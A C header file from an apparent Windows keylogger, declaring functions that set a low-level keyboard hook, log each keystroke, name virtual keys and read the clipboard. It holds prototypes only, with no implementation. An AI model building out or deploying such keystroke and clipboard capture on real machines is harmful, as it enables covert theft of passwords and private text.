#pragma once

#ifndef __KEYLOGGER_H_INCLUDED__
#define __KEYLOGGER_H_INCLUDED__

#include <Windows.h>

CONST PTCHAR   GetVirtualKeyName(CONST DWORD vkCode);
CONST PTCHAR   GetClipboardBuffer();
BOOL           LogKey(CONST PKBDLLHOOKSTRUCT kbdhs);
LRESULT WINAPI KeyboardHook(INT code, WPARAM wParam, LPARAM lParam);
BOOL           SetKeyboardHook();

#endif /* __KEYLOGGER_H_INCLUDED__ */